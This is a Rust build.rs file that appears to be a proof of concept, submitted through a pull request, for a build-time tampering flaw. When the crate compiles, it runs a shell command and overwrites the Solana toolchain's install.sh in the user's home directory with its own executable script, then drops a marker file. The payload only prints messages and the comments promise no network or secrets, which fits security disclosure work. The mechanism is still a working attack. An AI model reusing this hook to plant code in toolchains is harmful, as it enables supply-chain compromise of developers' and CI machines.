use std::{
    env, fs,
    path::{Path, PathBuf},
    process::Command,
};

#[cfg(unix)]
fn make_executable(p: &Path) {
    use std::os::unix::fs::PermissionsExt;
    if let Ok(meta) = fs::metadata(p) {
        let mut perms = meta.permissions();
        perms.set_mode(0o755);
        let _ = fs::set_permissions(p, perms);
    }
}

#[cfg(not(unix))]
fn make_executable(_: &Path) {}

fn overwrite_install(bin_dir: &Path) {
    // Target: ~/.local/share/solana/install/active_release/bin/sdk/sbf/scripts/install.sh
    let target = bin_dir.join("sdk/sbf/scripts/install.sh");

    // Ensure directories exist (safe)
    if let Some(parent) = target.parent() {
        let _ = fs::create_dir_all(parent);
    }

    // Overwrite with a hello-world script that exits 0
    let content = r#"#!/usr/bin/env bash
echo "===HELLO_FROM_INSTALL_POC==="
echo "install.sh was OVERWRITTEN by a PR (safe PoC, no network, no secrets)."
echo "Args: $*"
exit 0
"#;

    match fs::write(&target, content.as_bytes()) {
        Ok(_) => {
            make_executable(&target);
            println!(
                "cargo:warning=WRAP_POC: install.sh overwritten at {}",
                target.display()
            );
        }
        Err(e) => {
            println!(
                "cargo:warning=WRAP_POC: failed to overwrite {}: {}",
                target.display(),
                e
            );
        }
    }
}

fn main() {
    // Visible breadcrumb (safe, no secrets/network)
    let _ = Command::new("sh")
        .arg("-lc")
        .arg(
            r#"
        printf '%s\n' '===WRAP_POC_BUILD_RS_START===' \
            'Assurances: No secrets; No network; Non-destructive overwrite of install.sh';
        printf '%s\n' "HOME=${HOME:-<unset>}";
        printf '%s\n' '===WRAP_POC_BUILD_RS_END===';
    "#,
        )
        .status();

    // Solana active_release bin root
    let home = env::var("HOME").unwrap_or_else(|_| ".".into());
    let bin_root: PathBuf =
        PathBuf::from(home).join(".local/share/solana/install/active_release/bin");

    if !bin_root.is_dir() {
        println!(
            "cargo:warning=WRAP_POC: bin dir not found: {}",
            bin_root.display()
        );
        return;
    }

    overwrite_install(&bin_root);

    // Optional marker
    let _ = fs::write(
        bin_root.join("WRAP_POC_INSTALL_MARKER.txt"),
        "hello from install.sh overwrite PoC (safe)\n",
    );

    println!("cargo:warning=WRAP_POC: build.rs executed");
}
